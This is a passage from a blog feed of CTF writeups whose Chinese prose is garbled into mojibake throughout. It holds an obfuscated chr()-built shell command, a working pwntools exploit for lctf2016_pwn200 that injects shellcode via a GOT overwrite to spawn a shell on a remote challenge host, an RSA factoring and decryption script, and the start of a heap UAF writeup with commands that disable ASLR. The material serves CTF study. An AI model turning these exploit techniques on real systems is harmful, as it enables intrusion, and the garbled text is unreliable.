class="built_in">chr</span>(<span class="number">122</span>), <span class="built_in">chr</span>(<span class="number">105</span>), <span class="built_in">chr</span>(<span class="number">112</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">122</span>), <span class="built_in">chr</span>(<span class="number">105</span>), <span class="built_in">chr</span>(<span class="number">112</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">45</span>), <span class="built_in">chr</span>(<span class="number">114</span>), <span class="built_in">chr</span>(<span class="number">80</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">104</span>), <span class="built_in">chr</span>(<span class="number">101</span>), <span class="built_in">chr</span>(<span class="number">104</span>),</span><br><span class="line">      <span class="built_in">chr</span>(<span class="number">101</span>), <span class="built_in">chr</span>(<span class="number">104</span>), <span class="built_in">chr</span>(<span class="number">101</span>), <span class="built_in">chr</span>(<span class="number">50</span>), <span class="built_in">chr</span>(<span class="number">51</span>), <span class="built_in">chr</span>(<span class="number">51</span>), <span class="built_in">chr</span>(<span class="number">95</span>), <span class="built_in">chr</span>(<span class="number">73</span>), <span class="built_in">chr</span>(<span class="number">103</span>), <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">116</span>), <span class="built_in">chr</span>(<span class="number">114</span>),</span><br><span class="line">      <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">116</span>), <span class="built_in">chr</span>(<span class="number">65281</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">102</span>), <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">103</span>), <span class="built_in">chr</span>(<span class="number">46</span>), <span class="built_in">chr</span>(<span class="number">122</span>),</span><br><span class="line">      <span class="built_in">chr</span>(<span class="number">105</span>), <span class="built_in">chr</span>(<span class="number">112</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">102</span>), <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">103</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">114</span>), <span class="built_in">chr</span>(<span class="number">109</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">102</span>), <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">103</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">101</span>), <span class="built_in">chr</span>(<span class="number">99</span>), <span class="built_in">chr</span>(<span class="number">104</span>), <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">34</span>), <span class="built_in">chr</span>(<span class="number">73</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">65</span>), <span class="built_in">chr</span>(<span class="number">77</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">82</span>),</span><br><span class="line">      <span class="built_in">chr</span>(<span class="number">79</span>), <span class="built_in">chr</span>(<span class="number">79</span>), <span class="built_in">chr</span>(<span class="number">84</span>), <span class="built_in">chr</span>(<span class="number">33</span>), <span class="built_in">chr</span>(<span class="number">33</span>), <span class="built_in">chr</span>(<span class="number">33</span>), <span class="built_in">chr</span>(<span class="number">33</span>), <span class="built_in">chr</span>(<span class="number">34</span>)</span><br><span class="line">      )</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z i p   - r P   h e h e h e 2 3 3 _ I g o t r o o t ï¼   f l a g . z i p</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°å‹ç¼©åŒ…å¯†ç ï¼Œç»“æŸã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>lctf2016_pwn200 writeup</title>
      <link href="/2021/10/27/lctf2016_pwn200%20writeup/"/>
      <url>/2021/10/27/lctf2016_pwn200%20writeup/</url>
      
        <content type="html"><![CDATA[<p>buuåˆ·é¢˜è®°å½•-<a href="https://buuoj.cn/challenges#lctf2016_pwn200">lctf2016_pwn200</a></p><span id="more"></span><h2 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><p>checksec 64ä½ä¿æŠ¤å…¨å…³ï¼Œå¹¶ä¸”æ ˆå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œé‚£ä¹ˆä¸»è¦æ€è·¯åº”è¯¥æ˜¯æ‰§è¡Œshellcodeäº†ã€‚mainå‡½æ•°ä¸€ä¸ªIOåˆå§‹åŒ–å’Œä¸€ä¸ªå‡½æ•°ï¼Œè¿›å»å‘ç°æœ‰ä¸€ä¸ªnameè¾“å…¥ï¼Œæ˜¯ç”¨for - read(1)å®ç°çš„ï¼Œä½†æ˜¯è§‚å¯Ÿç¼“å†²åŒºå’Œå¾ªç¯å¤§å°ï¼Œå‘ç°ç¼“å†²åŒºå¤§å°ä¸å¾ªç¯æ¬¡æ•°ç›¸åŒï¼Œæ„å‘³ç€å¦‚æœæˆ‘è¾“å…¥å¡«æ»¡ç¼“å†²åŒºï¼Œä¸€ä¼šè¾“å‡ºåå­—çš„æ—¶å€™å¯ä»¥æ³„éœ²æ ˆåœ°å€ã€‚sub_4007DFè¿™ä¸ªå‡½æ•°å°±æ˜¯è¾“å…¥ä¸€ä¸ª3ä½æ•°å€¼è¿”å›intã€‚ç»§ç»­å¾€ä¸‹çœ‹å‘ç°å®ƒåˆæœ‰ä¸€ä¸ªä¸ç¼“å†²åŒºå¤§å°ç›¸ç­‰çš„ä¸€æ¬¡è¾“å…¥ï¼Œå¹¶ä¸”å¯ä»¥è¦†ç›–åˆ°char *destè¿™ä¸ªæŒ‡é’ˆå˜é‡ï¼Œä¸€ä¼šä¼šå°†æ•´ä¸ªç¼“å†²åŒºä»¥å­—ç¬¦ä¸²å½¢å¼æ‹·è´åˆ°é‚£ä¸ªæŒ‡é’ˆå†…çš„åœ°å€ä¸­ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬å°†pträ¿®æ”¹é‚£åŸºæœ¬æ˜¯ä»»æ„åœ°å€å†™äº†ï¼ŒåŠ ä¸Šä¹‹å‰æ³„éœ²çš„ç«™åœ°å€ä¾¿å¯ä»¥åœ¨ä¸Šé¢æ‰§è¡Œshellcodeï¼Œä½†æ˜¯åŒæ—¶ä¹Ÿæœ‰é™åˆ¶ï¼Œé‚£å°±æ˜¯è¿™æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æ‹·è´ï¼Œå¦‚æœéœ€è¦åœ¨è¿”å›çš„æ—¶å€™æ‰§è¡Œshellcodeé‚£ä¹ˆéœ€è¦å¡«ä¸Šshellcodeåå…ˆæ”¾ä¸Šä¸€ä¸ªjmp rspçš„åœ°å€ã€‚è€Œ64ä½ç¨‹åºåœ°å€è™½å 8ä¸ªå­—èŠ‚ä½†æ˜¯å®é™…é«˜ä¸¤ä¸ªå­—èŠ‚ä¸€èˆ¬éƒ½æ˜¯ç©ºçš„ï¼Œåé¢çš„shellcodeå¾ˆå¯èƒ½æ— æ³•æ‹·è´ã€‚æˆ‘è¿˜å°è¯•è¿‡æ ˆè¿ç§»ï¼Œä½†æ˜¯æ ˆè¿ç§»éœ€è¦æ”¹è¿ç»­çš„ä¸¤ä¸ªä¸ºåœ°å€ï¼Œä¹Ÿä¸èƒ½è¿ç»­æ‹·è´ã€‚é‚£ä¹ˆå¯ä»¥å°è¯•åŠ«æŒgotè¡¨ï¼Œè®©å®ƒåœ¨åé¢æ‰§è¡ŒæŸäº›å‡½æ•°çš„æ—¶å€™åŠ«æŒåˆ°æ ˆä¸Šé¢çš„shellcodeé‡Œé¢ã€‚</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>ä¸»è¦å°±æ˜¯å†™åœ¨gotè¡¨çš„åœ°å€è¦ç¡®å®šæ˜¯shellcodeçš„åœ°å€ï¼Œè¿™ä¸ªå¯ä»¥é€šè¿‡è‡ªå·±è°ƒè¯•å»åå¤ç¡®å®šã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27025</span>)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">48</span></span><br><span class="line">p.send(payload)</span><br><span class="line">stack_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))-<span class="number">120</span>-<span class="number">0x28</span>-<span class="number">32</span>+<span class="number">8</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))<span class="comment">#+120</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;id&#x27;</span>,<span class="string">b&#x27;33&#x27;</span>)</span><br><span class="line">payload=p64(stack_addr)+asm(shellcraft.sh())</span><br><span class="line">payload=payload.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;e&#x27;</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;~&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x400a8d&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021æ±Ÿè¥¿çœèµ›RSA writeup</title>
      <link href="/2021/10/27/2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9BRSA/"/>
      <url>/2021/10/27/2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9BRSA/</url>
      
        <content type="html"><![CDATA[<p>æ¥æºäºä¸€ä½å¸ˆå‚…å‘çš„RSAçš„é¢˜ç›®ï¼Œè¿™é¢˜æ­£è§£æ˜¯å¥—å…¬å¼ï¼Œä½†æ˜¯å…¶å®å¯ä»¥ç›´æ¥åˆ†è§£nã€‚</p><p>é¢˜æ¥åº·åº·åˆ«çš„å¸ˆå‚…å‘ç»™æˆ‘çš„æ±Ÿè¥¿çœèµ›çš„cryé¢˜ï¼Œå‘ç°è‡ªå·±è¿˜æ˜¯èƒ½å¾ˆå¥½çš„è¿ç”¨ä¸€äº›å°æŠ€å·§çš„ï¼Œæ­£è§£è™½ç„¶ä¸ç”¨åˆ†è§£nï¼Œä½†æ˜¯å’±è¿˜æ˜¯å¯ä»¥åˆ†è§£nçš„hhh</p><span id="more"></span><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">27552304606229034903366058815849954030287648695063385362955432137790872571412035824128918674719247737295565001575991597519270789776408208970323808016733976338433371328100880898942106515627607388226912870981180215883273805491209461671730377099185278711453949265641966582563910708529619185885928310168288810488784242368160743359666583499117949407921812317700250240067929572558785431071173411100434109661677786734923283679392823901052633992456780285091988542875991410528415886437666510014123352497264017734716859350294159440761760921548702546470902740121962033241003215821780125194400741190925169397917247376657863011603</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">8643831704675414121804983915084443744489969712473300784256427784417167322852556975560503484179280700293119974607254037642425650493676448134024809335297135239994950178868535219541095694358323044214971760829173918774094415933808417722001811285178546917655837402000771685507972240389565704149610032767242977174132826100177368764169367458684152505611469248099487912367364804360878611296860803835816266114046682291529593099394952245852157119233687981777202751472502060481232341206366584532964027749320641690448228420342308891797513656897566100268729012788419021059054907653832828437666012596894150751431936476816983845357</span></span><br><span class="line">p-q=<span class="number">3216514606297172806828066063738105740383963382396892688569683235383985567043193404185955880509592930874764682428425994713750665248099953457550673860782324431970917492727256948066013701406000049963109681898567026552657377599263519201715733179565306750754520746601394738797021362510415215113118083969304423858</span></span><br></pre></td></tr></table></figure><p>é¢˜ç›®ç»™äº†nå’Œå¯†æ–‡ï¼Œè¿˜ç»™äº†på’Œqçš„å…³ç³»å¼ï¼Œä½†æ˜¯næ˜¯600å¤šä½åè¿›åˆ¶æ•°ç›´æ¥åˆ†è§£ä¸å¤ªç°å®ï¼Œå³ä¾¿ç¡®å®šäº†på’Œqçš„ä½æ•°å¤æ‚åº¦ä¹Ÿä¸å…è®¸ã€‚è€Œä¸”å®ƒæ•°æ®åˆšåˆšå¥½ï¼Œpythonæ— æ³•ç›´æ¥è¡¨ç¤ºï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¾ˆéš¾ç”¨pythonå†™è¿™ä¸ªåˆ†è§£nçš„è„šæœ¬ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆå¥½ç”¨çš„ä¸œè¥¿ï¼šjavaå¤§æ•°ï¼Œjavaå¤§æ•°æ˜¯å­—ç¬¦ä¸²å°è£…çš„å¯ä»¥è¿ç®—çš„æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ªå¾ˆå¥½çš„è¿ç®—äº†ã€‚</p><p>æ—¢ç„¶ç›´æ¥åˆ†æä¸å¯è¡Œçš„è¯é‚£ä¹ˆé‡‡å–å…¶å®ƒç­–ç•¥â€”â€”çˆ†ç ´</p><h2 id="ç¼–å†™è„šæœ¬"><a href="#ç¼–å†™è„šæœ¬" class="headerlink" title="ç¼–å†™è„šæœ¬"></a>ç¼–å†™è„šæœ¬</h2><p>æ€æƒ³æ˜¯ç¡®å®špçš„ä½æ•°ï¼Œç„¶åq=p+xï¼Œä»é«˜ä½æšä¸¾ï¼Œç›´åˆ°p*(p+x)åˆšå¥½&lt;nç¡®å®šè¿™ä¸€ä½æ•°ï¼Œå°±ç®—pæ˜¯300å¤šä½ï¼Œæ¯ä½æšä¸¾10ä¸­æƒ…å†µå¤æ‚åº¦ä¹Ÿä¸ç®—é«˜ï¼Œé‚£ä¹ˆè¿™ä¸ªå°±ç”¨javaå†™è„šæœ¬çˆ†ç ´äº†ã€‚</p><p>é¦–å…ˆç¡®å®šä¸€ä¸‹pçš„ä½æ•°ï¼Œè¿™ä¸ªå¾ˆéš¾ç®€å•ï¼Œç›´æ¥éšä¾¿å–è‹¥å¹²ä½æ•°ä¸ºpï¼Œå†ç®—(p+x)*pä¸nç›¸é™¤ï¼Œè‹¥å¾—å‡ºæ¥çš„å€¼ä¸è¶…è¿‡10é‚£åŸºæœ¬å°±æ˜¯è¿™ä¹ˆå¤šä½æ•°äº†ï¼Œè¿™é‡Œç®—å‡ºæ¥ä½æ•°æ˜¯310ä½</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> java.math.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">bignumber</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        Scanner sc=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        BigInteger n = <span class="keyword">new</span> BigInteger(<span class="string">&quot;27552304606229034903366058815849954030287648695063385362955432137790872571412035824128918674719247737295565001575991597519270789776408208970323808016733976338433371328100880898942106515627607388226912870981180215883273805491209461671730377099185278711453949265641966582563910708529619185885928310168288810488784242368160743359666583499117949407921812317700250240067929572558785431071173411100434109661677786734923283679392823901052633992456780285091988542875991410528415886437666510014123352497264017734716859350294159440761760921548702546470902740121962033241003215821780125194400741190925169397917247376657863011603&quot;</span>);</span><br><span class="line">        BigInteger x = <span class="keyword">new</span> BigInteger(<span class="string">&quot;3216514606297172806828066063738105740383963382396892688569683235383985567043193404185955880509592930874764682428425994713750665248099953457550673860782324431970917492727256948066013701406000049963109681898567026552657377599263519201715733179565306750754520746601394738797021362510415215113118083969304423858&quot;</span>);</span><br><span class="line">        BigInteger i = <span class="keyword">new</span> BigInteger(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">310</span>;j&gt;=<span class="number">1</span>;j--) &#123;</span><br><span class="line">            String s=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;j-<span class="number">1</span>;k++) &#123;</span><br><span class="line">                s+=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            BigInteger pow=<span class="keyword">new</span> BigInteger(s);</span><br><span class="line">            <span class="comment">//System.out.println(pow);</span></span><br><span class="line">            <span class="keyword">int</span> bit=<span class="number">10</span>;</span><br><span class="line">            BigInteger p=<span class="keyword">new</span> BigInteger(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                bit--;</span><br><span class="line">                BigInteger m=pow.multiply(<span class="keyword">new</span> BigInteger(Integer.toString(bit)));</span><br><span class="line">                BigInteger a=m.add(i);</span><br><span class="line">                p=a.multiply(a.add(x));</span><br><span class="line">            &#125;<span class="keyword">while</span>(n.compareTo(p)==-<span class="number">1</span>);</span><br><span class="line">            <span class="comment">//System.out.println(bit);</span></span><br><span class="line">            i=i.add(pow.multiply(<span class="keyword">new</span> BigInteger(Integer.toString(bit))));</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/27/2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9BRSA/1.png" alt="1"></p><p>å¾ˆå®¹æ˜“å°±çˆ†ç ´å‡ºæ¥äº†ï¼Œæœ€ç»ˆå¾—åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">164388402596326998398734266483348689718634308613134769513823133531277866932924580863368129180110157251658299906566819446945741582875064595447688991363818514760290461718304500609014489162133123761201603375706506435381197548902899274601380329856241471126508515906897368912158915277705061990280370468267906281833</span></span><br></pre></td></tr></table></figure><p>è§£å¯†è„šæœ¬:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n=<span class="number">27552304606229034903366058815849954030287648695063385362955432137790872571412035824128918674719247737295565001575991597519270789776408208970323808016733976338433371328100880898942106515627607388226912870981180215883273805491209461671730377099185278711453949265641966582563910708529619185885928310168288810488784242368160743359666583499117949407921812317700250240067929572558785431071173411100434109661677786734923283679392823901052633992456780285091988542875991410528415886437666510014123352497264017734716859350294159440761760921548702546470902740121962033241003215821780125194400741190925169397917247376657863011603</span></span><br><span class="line">p=<span class="number">164388402596326998398734266483348689718634308613134769513823133531277866932924580863368129180110157251658299906566819446945741582875064595447688991363818514760290461718304500609014489162133123761201603375706506435381197548902899274601380329856241471126508515906897368912158915277705061990280370468267906281833</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">8643831704675414121804983915084443744489969712473300784256427784417167322852556975560503484179280700293119974607254037642425650493676448134024809335297135239994950178868535219541095694358323044214971760829173918774094415933808417722001811285178546917655837402000771685507972240389565704149610032767242977174132826100177368764169367458684152505611469248099487912367364804360878611296860803835816266114046682291529593099394952245852157119233687981777202751472502060481232341206366584532964027749320641690448228420342308891797513656897566100268729012788419021059054907653832828437666012596894150751431936476816983845357</span></span><br><span class="line">x=<span class="number">3216514606297172806828066063738105740383963382396892688569683235383985567043193404185955880509592930874764682428425994713750665248099953457550673860782324431970917492727256948066013701406000049963109681898567026552657377599263519201715733179565306750754520746601394738797021362510415215113118083969304423858</span></span><br><span class="line">q=p+x</span><br><span class="line"></span><br><span class="line">d=inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag=long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="/2021/10/27/2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9BRSA/2.png" alt="2"></p><p>å¾—åˆ°flag=flag{9c0532a253809f180747b6da334b438f}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020æµ™æ±Ÿçœèµ› pwn2 writeup</title>
      <link href="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/"/>
      <url>/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/</url>
      
        <content type="html"><![CDATA[<p>å›½åº†å¤çš„ç›˜ï¼Œä»Šå¤©è¡¥ä¸€ä¸‹</p><span id="more"></span><h2 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><p>checksecä¿æŠ¤å…¨å¼€ã€‚</p><p>ç»å…¸èœå•é¢˜ï¼Œæ²¡æœ‰å»ç¬¦å·è¡¨ï¼ŒæŸ¥çœ‹menuå‡½æ•°å‘ç°åªæœ‰æ·»åŠ å’Œåˆ é™¤æ“ä½œï¼Œä½†æ˜¯å¯ä»¥å‘ç°åˆ é™¤æ“ä½œæ˜¯é€šè¿‡å‡½æ•°æŒ‡é’ˆå®ç°çš„ã€‚å¹¶ä¸”åˆ†little å’Œ bigçš„åŒºåˆ«ï¼Œfree littleå°±æ˜¯ä¸€ä¸ªfreeï¼Œfree big å°±æ˜¯è¦æŠŠé‚£ä¸ªå †å—é‡Œé¢çš„å†…å®¹æŒ‡å‘çš„å †å—freeäº†è¿˜è¦æŠŠæœ¬èº«ç»™freeï¼Œä½†æ˜¯æŒ‡é’ˆå¹¶æ²¡æœ‰æ¸…é›¶ã€‚é€ æˆäº†UAFæ¼æ´ï¼Œå¹¶ä¸”åœ¨addçš„æ—¶å€™æ ¹æ®å­—ç¬¦ä¸²é•¿åº¦æ¥åˆ†é…å¤§å°ï¼Œå¹¶ä¸”ä¼šå…ˆè¯»æ ˆä¸Šï¼Œç„¶ååœ¨strcpyæ‹·è´ï¼Œè¿™å°±æ„å‘³ç€è¾“å…¥ä¸èƒ½å­˜åœ¨\0ã€‚å¹¶ä¸”ä½ è¾“å…¥çš„sizeåªè·Ÿä½ è¾“å…¥å¤§å°æœ‰å…³ï¼Œå®ƒæ‹·è´åˆ†é…çš„å¤§å°è¿˜æ˜¯ç”¨strlenç®—å‡ºæ¥é•¿åº¦å†mallocç„¶åstrcpyï¼Œè¿™ä¸€æ³¢æ“ä½œä¸‹æ¥å°±æ²¡åŠæ³•æº¢å‡ºæ“ä½œï¼Œå¹¶ä¸”ç”±äº\0æˆªæ–­ä¹Ÿé™åˆ¶äº†å¾ˆå¤šã€‚å¼€äº†PIEæ— æ³•unlinkï¼Œå’Œç”¨gotè¡¨æ³„éœ²libcï¼Œè€Œæ³„éœ²ç¨‹åºåŸºå€ä¹Ÿæ˜¯æ¯”è¾ƒéš¾çš„(è™½ç„¶æ­£è§£æ˜¯æ³„éœ²ç¨‹åºåŸºå€çš„awa)ã€‚</p><h2 id="æ³„éœ²libc"><a href="#æ³„éœ²libc" class="headerlink" title="æ³„éœ²libc"></a>æ³„éœ²libc</h2><p>è€ƒè™‘åŠ«æŒå‡½æ•°æŒ‡é’ˆï¼Œç›´æ¥è¦†ç›–éƒ¨åˆ†æ¥ä¿®æ”¹å‡½æ•°ï¼Œå‘ç°freebigå’Œfreelittleå‡½æ•°æŒ‡é’ˆéƒ½åœ¨å †ä¸Šé¢ï¼Œç”±äºåªæœ‰æœ€åä¸‰ä½ç›¸åŒï¼Œè€Œæˆ‘ä»¬è¦†ç›–æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½çš„ï¼Œåœ¨è°ƒè¯•å¯ä»¥é€‰æ‹©å…ˆå…³äº†ASLRï¼Œè®©å®ƒåœ¨ç¡®å®šä½ç½®ä¸ŠåŠ è½½ä¸å¦¨ç¢è°ƒè¯•ï¼Œå‡ºäº†ä¹‹åä¹Ÿå°±éœ€è¦çˆ†ç ´è¿™åŠä¸ªå­—èŠ‚åå…­åˆ†ä¹‹ä¸€çš„æ¦‚ç‡è¿˜æ˜¯æ¯”è¾ƒå¯è§‚çš„ã€‚ä½†æ˜¯æˆ‘çš„ç”µè„‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆç‰¹æ®Šä¸€ç‚¹çš„ï¼Œå®ƒç¨‹åºåŠ è½½çš„åŸºå€æœ«äº”ä½éƒ½æ˜¯0ï¼Œé‚£è¿™æ ·æˆ‘è°ƒè¯•å°±æ›´åŠ æ–¹ä¾¿äº†ï¼Œç›´æ¥å†™ä¸Šä¸¤ä¸ªå­—èŠ‚è¿‡å»å°±å®Œäº‹äº†ã€‚å¦‚æœä½ çš„ä½ çš„æœºå­æ²¡æœ‰è¿™ä¸ªç‰¹æ€§å¯ä»¥å‚è€ƒä»¥ä¸‹æ“ä½œã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sudo su</span><br><span class="line">#echo 0 &gt;/proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ³¢æ“ä½œä¹‹åä¼šè®©ç¨‹åºå’Œlibcåœ¨ç¡®å®šçš„åŸºå€ä¸Šè¿è¡Œï¼Œè¿™æ ·å¦‚æœéœ€è¦çˆ†ç 